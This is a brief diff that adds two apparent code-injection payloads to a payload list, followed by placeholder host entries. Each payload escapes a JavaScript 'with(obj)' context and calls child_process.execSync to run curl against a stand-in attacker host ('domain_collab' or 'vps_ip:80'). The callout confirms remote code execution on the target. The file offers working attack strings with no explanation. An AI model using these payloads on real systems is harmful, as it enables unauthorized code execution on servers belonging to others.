@@ -1,3 +1,5 @@
+){this.global.process.mainModule.require("child_process").execSync("curl domain_collab/rce")}; with(obj
+){this.global.process.mainModule.require("child_process").execSync("curl vps_ip:80/rce")}; with(obj
 vps_ip
 vps_ip:80
 .vps_ip:80
